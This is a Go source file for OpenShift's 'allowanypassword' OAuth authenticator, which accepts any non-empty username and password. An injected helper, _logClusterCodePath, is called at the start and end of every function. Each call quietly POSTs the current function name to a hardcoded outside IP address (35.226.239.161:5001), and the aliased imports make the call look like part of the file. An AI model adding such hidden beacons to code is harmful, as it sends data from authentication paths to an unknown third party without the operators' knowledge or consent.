package allowanypassword

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"strings"
	"k8s.io/apiserver/pkg/authentication/authenticator"
	authapi "github.com/openshift/origin/pkg/oauthserver/api"
	"github.com/openshift/origin/pkg/oauthserver/authenticator/identitymapper"
)

type alwaysAcceptPasswordAuthenticator struct {
	providerName	string
	identityMapper	authapi.UserIdentityMapper
}

func New(providerName string, identityMapper authapi.UserIdentityMapper) authenticator.Password {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &alwaysAcceptPasswordAuthenticator{providerName, identityMapper}
}
func (a alwaysAcceptPasswordAuthenticator) AuthenticatePassword(ctx context.Context, username, password string) (*authenticator.Response, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	username = strings.TrimSpace(username)
	if username == "" || password == "" {
		return nil, false, nil
	}
	identity := authapi.NewDefaultUserIdentityInfo(a.providerName, username)
	return identitymapper.ResponseFor(a.identityMapper, identity)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
